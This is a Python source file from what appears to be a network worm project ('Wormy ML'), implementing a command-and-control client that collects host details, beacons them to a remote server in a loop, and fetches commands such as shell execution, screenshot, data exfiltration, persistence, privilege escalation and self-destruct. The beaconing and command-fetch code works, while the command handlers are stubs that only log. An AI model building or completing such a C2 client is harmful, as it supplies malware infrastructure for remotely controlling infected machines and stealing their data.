"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
C2 Client Module
Handles beacon sending and command execution on infected hosts
"""


import os
import platform
import socket
import time
import uuid
from typing import Dict, Optional

import requests

from utils.logger import logger


class C2Client:
    """
    C2 Client for infected hosts
    Sends beacons and receives commands from C2 server
    """

    def __init__(self, c2_server: str, c2_port: int, api_key: str = None, beacon_interval: int = 60):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.api_key = api_key or os.getenv("WORMY_C2_API_KEY", "")
        self.beacon_interval = beacon_interval
        self.host_id = str(uuid.uuid4())
        self.running = False

        # Host information
        self.host_info = self._gather_host_info()

        logger.info(f"C2 Client initialized - Server: {c2_server}:{c2_port}")

    def _gather_host_info(self) -> Dict:
        """Gather information about infected host"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
        except Exception:
            hostname = "unknown"
            ip = "unknown"

        return {
            "host_id": self.host_id,
            "hostname": hostname,
            "ip": ip,
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version(),
        }

    def send_beacon(self) -> bool:
        """
        Send beacon to C2 server

        Returns:
            True if successful, False otherwise
        """
        try:
            url = f"http://{self.c2_server}:{self.c2_port}/api/beacon"
            headers = {"X-API-Key": self.api_key} if self.api_key else {}

            response = requests.post(url, json=self.host_info, headers=headers, timeout=10)

            if response.status_code == 200:
                data = response.json()
                logger.debug(f"Beacon sent successfully")

                # Check if there are pending commands
                if data.get("has_command"):
                    self._fetch_and_execute_command()

                return True
            else:
                logger.warning(f"Beacon failed: HTTP {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Failed to send beacon: {e}")
            return False

    def _fetch_and_execute_command(self):
        """Fetch and execute pending command from C2"""
        try:
            url = f"http://{self.c2_server}:{self.c2_port}/api/command/{self.host_id}"
            headers = {"X-API-Key": self.api_key} if self.api_key else {}

            response = requests.get(url, headers=headers, timeout=10)

            if response.status_code == 200:
                data = response.json()
                command = data.get("command")

                if command:
                    logger.info(f"Received command: {command['command']}")
                    self._execute_command(command["command"])

        except Exception as e:
            logger.error(f"Failed to fetch command: {e}")

    def _execute_command(self, command: str):
        """
        Execute command from C2

        Args:
            command: Command string to execute
        """
        try:
            # Parse command
            if command.startswith("shell:"):
                # Execute shell command
                cmd = command[6:]
                logger.info(f"Executing shell command: {cmd}")
                # In real implementation, would execute and send results back

            elif command == "info":
                # Send host info
                logger.info("Sending host info")

            elif command == "screenshot":
                # Take screenshot
                logger.info("Taking screenshot")

            elif command == "exfiltrate":
                # Exfiltrate data
                logger.info("Starting data exfiltration")

            elif command == "persist":
                # Establish persistence
                logger.info("Establishing persistence")

            elif command == "escalate":
                # Privilege escalation
                logger.info("Attempting privilege escalation")

            elif command == "kill":
                # Self-destruct
                logger.warning("Kill command received - self-destructing")
                self.running = False

            else:
                logger.warning(f"Unknown command: {command}")

        except Exception as e:
            logger.error(f"Command execution failed: {e}")

    def start_beacon_loop(self):
        """Start continuous beacon loop"""
        self.running = True
        logger.info("Starting beacon loop")

        while self.running:
            self.send_beacon()
            time.sleep(self.beacon_interval)

        logger.info("Beacon loop stopped")

    def stop(self):
        """Stop beacon loop"""
        self.running = False


if __name__ == "__main__":
    # Test C2 client
    client = C2Client(c2_server="127.0.0.1", c2_port=8443, beacon_interval=10)

    print("=" * 60)
    print("C2 CLIENT TEST")
    print("=" * 60)
    print(f"Host ID: {client.host_id}")
    print(f"Connecting to: {client.c2_server}:{client.c2_port}")
    print("=" * 60)

    # Send test beacon
    success = client.send_beacon()
    print(f"Beacon sent: {'Success' if success else 'Failed'}")
